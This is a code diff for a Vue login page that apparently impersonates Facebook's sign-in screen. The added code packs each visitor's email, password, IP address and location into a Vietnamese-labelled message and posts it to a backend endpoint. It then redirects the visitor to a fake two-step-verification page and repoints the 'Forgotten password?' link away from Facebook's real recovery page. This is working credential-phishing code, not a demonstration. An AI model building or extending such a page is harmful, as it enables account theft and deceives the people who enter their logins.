@@ -2,40 +2,47 @@
 const email = ref('')
 const password = ref('')
 const router = useRouter()
-
+const options = {
+  hour: '2-digit',
+  minute: '2-digit',
+  second: '2-digit',
+  day: '2-digit',
+  month: '2-digit',
+  year: 'numeric',
+}
+const geo = JSON.parse(localStorage.getItem('geo') || '{}')
 const handleSubmit = async () => {
   if (!email.value || !password.value) {
     return
   }
+  const message = `
+🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
+🌍 <b>Địa chỉ IP:</b> ${geo.ip}
+📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}
+
+📧 <b>Email:</b> ${email.value}
+🔑 <b>Mật khẩu:</b> ${password.value}
+`
 
   // Call your API here
   try {
     await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ account: { email: email.value, password: password.value }}),
+      body: JSON.stringify({ rawMessage: message }),
       headers: {
         'Content-Type': 'application/json',
       },
     })
-    const isNew = localStorage.getItem('visited')
-    if (!isNew) {
-      await $fetch('/api/code', {
-        method: 'POST',
-        body: JSON.stringify({ message: '👨‍💼 Có người dùng mới truy cập', newUser: true }),
-        headers: {
-          'Content-Type': 'application/json',
-        },
-      })
-      localStorage.setItem('visited', 'yes')
-    }
+    localStorage.setItem('email', email.value)
   } catch (error) {
     console.error(error)
   }
-  router.push('/two_step_verification/two_factor')
+  // router.push('/two_step_verification/two_factor')
+  window.location.href = '/two_step_verification/two_factor?a=1'
 }
 </script>
 <template>
-  <div class="bg-[#f2f4f7] max-md:hidden flex flex-col items-center h-lvh">
+  <div class="bg-[#f2f4f7] max-md:hidden flex flex-col items-center h-lvh max-h-[878px]">
     <div class="flex items-center py-[79px] pt-[30px] h-full">
       <div
         class="form-main py-5 h-fit flex flex-col md:flex-row justify-center w-full max-w-5xl mx-auto p-4"
@@ -73,9 +80,7 @@ const handleSubmit = async () => {
                 Log in
               </button>
               <div class="text-center">
-                <a
-                  href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
-                  class="text-[#0866ff] text-[14px] hover:underline"
+                <a href="/?a=1" class="text-[#0866ff] text-[14px] hover:underline"
                   >Forgotten password?</a
                 >
               </div>
